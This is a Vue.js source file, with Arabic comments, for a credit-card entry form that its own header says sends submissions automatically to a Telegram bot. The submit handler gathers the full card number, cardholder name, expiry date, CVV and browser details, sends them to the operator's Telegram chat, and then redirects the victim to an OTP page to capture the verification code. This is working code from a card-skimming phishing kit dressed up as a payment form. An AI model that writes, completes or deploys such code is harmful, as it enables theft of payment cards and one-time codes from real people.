/*
نموذج بطاقة ائتمان Vue.js مع إرسال تلقائي إلى بوت تليجرام
*/

new Vue({
  el: "#app",
  data() {
    return {
      currentCardBackground: Math.floor(Math.random()* 25 + 1), // just for fun :D
      cardName: "",
      cardNumber: "",
      cardMonth: "",
      cardYear: "",
      cardCvv: "",
      minCardYear: new Date().getFullYear(),
      amexCardMask: "#### ###### #####",
      otherCardMask: "#### #### #### ####",
      cardNumberTemp: "",
      isCardFlipped: false,
      focusElementStyle: null,
      isInputFocused: false,
      isSubmitting: false // لمنع الإرسال المتكرر
    };
  },
  mounted() {
    this.cardNumberTemp = this.otherCardMask;
    document.getElementById("cardNumber").focus();
  },
  computed: {
    getCardType () {
      let number = this.cardNumber;
      let re = new RegExp("^4");
      if (number.match(re) != null) return "visa";

      re = new RegExp("^(34|37)");
      if (number.match(re) != null) return "amex";

      re = new RegExp("^5[1-5]");
      if (number.match(re) != null) return "mastercard";

      re = new RegExp("^6011");
      if (number.match(re) != null) return "discover";
      
      re = new RegExp('^9792')
      if (number.match(re) != null) return 'troy'

      return "visa"; // default type
    },
    generateCardNumberMask () {
      return this.getCardType === "amex" ? this.amexCardMask : this.otherCardMask;
    },
    minCardMonth () {
      if (this.cardYear === this.minCardYear) return new Date().getMonth() + 1;
      return 1;
    }
  },
  watch: {
    cardYear () {
      if (this.cardMonth < this.minCardMonth) {
        this.cardMonth = "";
      }
    }
  },
  methods: {
    flipCard (status) {
      this.isCardFlipped = status;
    },
    focusInput (e) {
      this.isInputFocused = true;
      let targetRef = e.target.dataset.ref;
      let target = this.$refs[targetRef];
      this.focusElementStyle = {
        width: `${target.offsetWidth}px`,
        height: `${target.offsetHeight}px`,
        transform: `translateX(${target.offsetLeft}px) translateY(${target.offsetTop}px)`
      }
    },
    blurInput() {
      let vm = this;
      setTimeout(() => {
        if (!vm.isInputFocused) {
          vm.focusElementStyle = null;
        }
      }, 300);
      vm.isInputFocused = false;
    },
    /**
     * التحقق من صحة بيانات البطاقة
     */
    validateCardData() {
      // التحقق من ملء جميع الحقول
      if (!this.cardNumber || !this.cardName || !this.cardMonth || !this.cardYear || !this.cardCvv) {
        alert("❌ يرجى ملء جميع الحقول");
        return false;
      }

      // التحقق من طول رقم البطاقة
      const cleanCardNumber = this.cardNumber.replace(/\s/g, '');
      if (cleanCardNumber.length < 13 || cleanCardNumber.length > 19) {
        alert("❌ رقم البطاقة غير صحيح");
        return false;
      }

      // التحقق من طول CVV
      if (this.cardCvv.length < 3 || this.cardCvv.length > 4) {
        alert("❌ رمز CVV غير صحيح");
        return false;
      }

      // التحقق من أن اسم صاحب البطاقة يحتوي على أحرف فقط
      if (!/^[a-zA-Zأ-ي\s]+$/.test(this.cardName)) {
        alert("❌ اسم صاحب البطاقة يجب أن يحتوي على أحرف فقط");
        return false;
      }

      return true;
    },
    /**
     * تنسيق رسالة البيانات
     */
    formatCardMessage() {
      return `
📋 <b>بيانات بطاقة ائتمان جديدة:</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━
💳 <b>رقم البطاقة:</b> <code>${this.cardNumber}</code>
👤 <b>اسم صاحب البطاقة:</b> ${this.cardName}
📅 <b>تاريخ الانتهاء:</b> ${this.cardMonth}/${this.cardYear}
🔐 <b>CVV:</b> <code>${this.cardCvv}</code>
💳 <b>نوع البطاقة:</b> ${this.getCardType.toUpperCase()}
━━━━━━━━━━━━━━━━━━━━━━━━━━━
⏰ <b>الوقت:</b> ${new Date().toLocaleString('ar-SA')}
🌐 <b>الجهاز:</b> ${navigator.userAgent}
      `.trim();
    },
    /**
     * إرسال البيانات إلى تليجرام
     */
    submitForm() {
      // منع الإرسال المتكرر
      if (this.isSubmitting) {
        alert("⏳ جاري إرسال البيانات، يرجى الانتظار...");
        return;
      }

      // التحقق من صحة البيانات
      if (!this.validateCardData()) {
        return;
      }

      // التحقق من إعدادات تلجرام
      if (!validateTelegramConfig()) {
        alert("❌ خطأ: إعدادات تلجرام غير صحيحة. يرجى تحديث ملف config.js");
        return;
      }

      this.isSubmitting = true;

      // إنشء رسالة البيانات
      const message = this.formatCardMessage();

      // إرسال الرسالة إلى تليجرام
      sendToTelegram(message)
        .then(data => {
          alert("✅ تم إرسال البيانات بنجاح إلى تليجرام\nيرجى إدخال رمز التحقق");
          
          // حفظ بيانات البطاقة في localStorage
          const cardData = {
            cardNumber: this.cardNumber,
            cardName: this.cardName,
            cardMonth: this.cardMonth,
            cardYear: this.cardYear,
            cardCvv: this.cardCvv,
            cardType: this.getCardType,
            timestamp: new Date().toISOString()
          };
          localStorage.setItem('cardData', JSON.stringify(cardData));
          
          // الانتقال إلى صفحة OTP بعد ثانية واحدة
          setTimeout(() => {
            window.location.href = 'otp.html';
          }, 1500);
        })
        .catch(error => {
          console.error("خطأ في الإرسال:", error);
          alert(`❌ حدث خطأ أثناء الإرسال:\n${error.message}`);
        })
        .finally(() => {
          this.isSubmitting = false;
        });
    }
  }
});
